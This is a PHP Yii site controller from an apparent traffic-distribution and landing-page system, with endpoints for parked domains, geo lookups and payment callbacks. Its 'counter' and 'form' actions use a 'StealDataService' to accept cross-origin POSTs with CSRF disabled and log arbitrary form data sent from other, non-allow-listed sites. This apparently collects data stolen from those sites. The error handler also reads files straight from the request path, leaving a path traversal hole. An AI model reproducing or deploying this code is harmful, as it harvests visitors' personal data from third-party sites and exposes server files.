<?php

namespace tds\controllers;

use common\helpers\FishHelper;
use common\models\finance\Currency;
use common\models\flow\Flow;
use common\models\landing\Landing;
use common\models\offer\Offer;
use common\models\offer\targets\advert\sku\TargetAdvertSkuRules;
use common\models\onlinePayment\OnlinePayment;
use common\models\order\Order;
use common\models\steal\StealDataSent;
use common\models\webmaster\parking\ParkingDomain;
use common\services\order\OrderNotFoundException;
use common\services\steal\StealDataService;
use common\services\webmaster\DomainParkingSrv;
use tds\services\LandingGeoService;
use tds\services\PaymentException;
use tds\services\PaymentService;
use Yii;
use yii\base\Exception;
use yii\web\Controller;
use yii\web\Response;

/**
 * Site controller
 */
class SiteController extends Controller
{
    public function behaviors()
    {
        $behaviors = parent::behaviors();

        $behaviors['corsFilter'] = [
            'class' => \yii\filters\Cors::className(),
            'cors' => [
                'Origin' => ['*'],
                'Access-Control-Request-Method' => ['POST'],
                'Access-Control-Allow-Credentials' => true,
                'Access-Control-Max-Age' => 3600,                 // Cache (seconds)
            ],
        ];

        $behaviors['verbs'] = [
            'class' => \yii\filters\VerbFilter::className(),
            'actions' => [
                'register' => ['post'],
                'counter' => ['post'],
                'form' => ['post'],
            ],
        ];

        return $behaviors;
    }


    public function beforeAction($action)
    {
        $this->enableCsrfValidation = false;
        return parent::beforeAction($action);
    }

    public function actions()
    {
//        return [
//            'error' => [
//                'class' => 'yii\web\ErrorAction',
//            ],
//        ];
    }

    public function actionError()
    {
        $response = Yii::$app->response;
        $response->statusCode = 200;
        $extension = pathinfo(Yii::$app->request->url, PATHINFO_EXTENSION);
        $domain = Yii::$app->request->serverName;
        if (!$extension) {
            if ($landing = (new DomainParkingSrv($domain))->getLanding()) {
                return $this->renderPartial('@parking/' . $landing->url . '/index');
            } else {
                return false;
            }
        }
        if ($landing = (new DomainParkingSrv($domain))->getLanding()) {

            if ($extension == 'png' || $extension == 'jpg' || $extension == 'jpeg' || $extension == 'svg' || $extension == 'gif') {
                $response->headers->set('Content-Type', 'image/' . $extension);

            } elseif ($extension == 'css') {
                $response->headers->set('Content-Type', 'text/css; charset=UTF-8');
            } elseif ($extension == 'js') {
                $response->headers->set('Content-Type', 'text/javascript; charset=UTF-8');
            } else {
                $response->headers->set('Content-Type', 'text/html');
            }

            $response->format = Response::FORMAT_RAW;
            if (!is_resource($response->stream = fopen(Yii::getAlias('@parking') . '/' . $landing->url . Yii::$app->request->url, 'r'))) {
                throw new \yii\web\ServerErrorHttpException('file access failed: permission deny');
            }

            $response->send();
        }

    }

    public function actionIndex()
    {
        $domain = Yii::$app->request->serverName;
        if ($landing = (new DomainParkingSrv($domain))->getLanding()) {
            return $this->renderPartial('@parking/' . $landing->url . '/index');
        }
        return $this->renderPartial('@landing_source/' . $domain . '/index');
    }


    public function actionGeoInfo()
    {
        $request = Yii::$app->request;

        if ($request->isGet) {
            $landing_id = $request->get('landing_id');
            $geo_iso = $request->get('geo_iso');

            if (!isset($landing_id)) throw new Exception('No landing Id!');

            $landingGeoService = new LandingGeoService($request, isset($geo_iso) ? $geo_iso : null);

            return json_encode($landingGeoService->result);
        }

        throw new Exception('Not valid Method!');
    }

    /**
     * Checking sites
     */
    public function actionCounter()
    {
        $request = Yii::$app->request;
        $steal = new StealDataService();

        if ($request->isPost) {
            $domain = $request->post('domain');
            $allowed_sites = $steal->checkSite($domain);
            $in_log = StealDataSent::checkRecordInLog($domain);

            if (empty($allowed_sites) && empty($in_log)) {
                $steal->save($domain);
            }
        }
    }

    /**
     * Save form data
     */
    public function actionForm()
    {
        $request = Yii::$app->request;
        $steal = new StealDataService();

        if ($request->isPost) {
            $form_data = json_encode($request->post());
            $site = Yii::$app->request->post('site');
            $allowed_sites = $steal->checkSite($site);

            if (empty($allowed_sites)) {
                $steal->writeToLogFile($form_data);
            }
        }
    }

    public function actionPriceraAvenue()
    {
        $request = Yii::$app->request->post();
//        $request = $this->getRequest();
        if (!$order = Order::findOne(['order_hash' => $request['order_id']]))
            throw new OrderNotFoundException($request['order_id']);

        if (!(new PaymentService())->savePayment($order, $request))
            throw new PaymentException();

        $this->redirect('http://binarywatch.aedeal.net/?geo=ae');
    }

    private function getRequest()
    {
//        $rcvdString = 'order_id=101516126928&tracking_id=107004183131&bank_ref_no=045378&order_status=Success&failure_message=&payment_mode=Credit Card&card_name=MasterCard&status_code=null&status_message=Approved¤cy=AED&amount=129.0&billing_name=asdas&billing_address=dasd&billing_city=asdasd&billing_state=&billing_zip=&billing_country=Australia&billing_tel=1231212312&billing_email=sadasda@df.er&delivery_name=&delivery_address=&delivery_city=&delivery_state=&delivery_zip=&delivery_country=&delivery_tel=&merchant_param1=&merchant_param2=&merchant_param3=&merchant_param4=&merchant_param5=&vault=N&offer_type=null&offer_code=null&discount_value=0.0&mer_amount=129.0&eci_value=05&card_holder_name=dsa&bank_receipt_no=801803045378&merchant_param6=5123452346';
//        $decryptValues = explode('&', $rcvdString);
//
//        FishHelper::debug($decryptValues, 1, 0);
//        $result = [];
//        foreach ($decryptValues as $value) {
//            $result_value = explode('=', $value);
//            $result[$result_value[0]] = $result_value[1];
//        }
        /** Example */
//        return $api_response_result = [
//            'order_id' => 101516126928,
//            'tracking_id' => 107004181748,
//            'bank_ref_no' => '028095',
//
//            'order_status' => 'Success',
//            'failure_message' => null,
//
//            'payment_mode' => 'Credit Card',
//            'card_name' => 'MasterCard',
//
//            'status_code' => null,
//            'status_message' => 'Approved',
//            'currency' => 'AED',
//            'amount' => 129.0,
//            'billing_name' => 'asdf',
//            'billing_address' => 'adsf',
//            'billing_city' => 'ererer',
//            'billing_state' => null,
//            'billing_zip' => null,
//            'billing_country' => 'Antarctica',
//            'billing_tel' => 4234234234,
//            'billing_email' => 'sdfsdf@try.rt',
//            'delivery_name' => null,
//            'delivery_address' => null,
//            'delivery_city' => null,
//            'delivery_state' => null,
//            'delivery_zip' => null,
//            'delivery_country' => null,
//            'delivery_tel' => null,
//            'merchant_param1' => null,
//            'merchant_param2' => null,
//            'merchant_param3' => null,
//            'merchant_param4' => null,
//            'merchant_param5' => null,
//            'vault' => 'N',
//            'offer_type' => null,
//            'offer_code' => null,
//            'discount_value' => 0.0,
//            'mer_amount' => 129.0,
//            'eci_value' => '05',
//            'card_holder_name' => 'asdasdasda',
//            'bank_receipt_no' => '801801028095',
//            'merchant_param6' => '5123452346',
//        ];
    }


}
